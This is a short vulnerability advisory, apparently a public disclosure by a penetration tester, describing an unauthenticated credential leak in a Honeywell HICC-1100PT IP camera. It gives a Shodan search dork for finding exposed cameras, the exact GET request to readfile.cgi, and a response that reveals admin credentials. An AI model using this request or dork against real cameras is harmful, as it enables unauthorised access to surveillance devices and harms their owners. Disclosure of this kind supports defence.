@@ -1,0 +1,59 @@
+1. Advisory Information
+========================================
+Title                   : Honeywell IP-Camera (HICC-1100PT) Unauthenticated Remote Credentials Disclosure
+Vendor Homepage         : https://www.asia.security.honeywell.com
+Remotely Exploitable	: Yes
+Tested on Camera types	: HICC-1100PT
+Reference               : https://www.asia.security.honeywell.com/Pages/product.aspx?category=720P-1.3M%20Box%20Camera&cat=HSG-ASIASECURITY&pid=HICC-1100T
+Vulnerability           : Username / Password Disclosure (Critical/High)
+Shodan Dork             : html:"Honeywell IP-Camera"
+Date                    : 18/08/2016
+Author                  : Yakir Wizman (https://www.linkedin.com/in/yakirwizman)
+ 
+ 
+2. CREDIT
+========================================
+This vulnerability was identified during penetration test by Yakir Wizman.
+  
+
+3. Description
+========================================
+Honeywell IP-Camera (HICC-1100PT) allows to unauthenticated user disclose the username & password remotely by simple request which made by browser.
+
+
+4. Proof-of-Concept:
+========================================
+Simply go to the following url:
+http://host:port/cgi-bin/readfile.cgi?query=ADMINID
+
+Should return some javascript variable which contain the credentials and other configuration vars:
+var Adm_ID="admin"; var Adm_Pass1=“admin”; var Adm_Pass2=“admin”; var Language=“en”; var Logoff_Time="0"; 
+
+
+Request:
+----------
+GET /cgi-bin/readfile.cgi?query=ADMINID HTTP/1.1
+Host: host:port
+Connection: close
+
+
+Response:
+----------
+HTTP/1.0 200 OK
+Connection: close
+Content-type: text/html
+
+var Adm_ID="admin";
+var Adm_Pass1=“admin”;
+var Adm_Pass2=“admin”;
+var Language=“en”;
+var Logoff_Time="0";
+
+
+
+Login @ http://host:port/cgi-bin/chklogin.cgi
+
+
+5. SOLUTION
+========================================
+Contact the vendor for further information regarding the proper mitigation of this vulnerability.
